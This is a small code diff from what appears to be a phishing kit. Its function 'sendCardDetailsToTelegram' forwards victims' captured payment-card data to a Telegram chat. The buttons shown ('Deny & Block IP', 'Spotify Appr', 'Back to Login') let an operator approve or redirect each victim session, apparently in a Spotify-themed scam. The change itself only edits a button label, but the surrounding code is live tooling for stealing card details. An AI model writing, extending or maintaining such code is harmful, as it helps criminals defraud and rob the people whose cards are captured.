@@ -524,7 +524,7 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
         ],
         [
           { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` },
-          { text: "🎵 Spotify Appr", callback_data: `spotify_appr_${sessionId}` }
+          { text: " Spotify Appr", callback_data: `spotify_appr_${sessionId}` }
         ],
         [
           { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
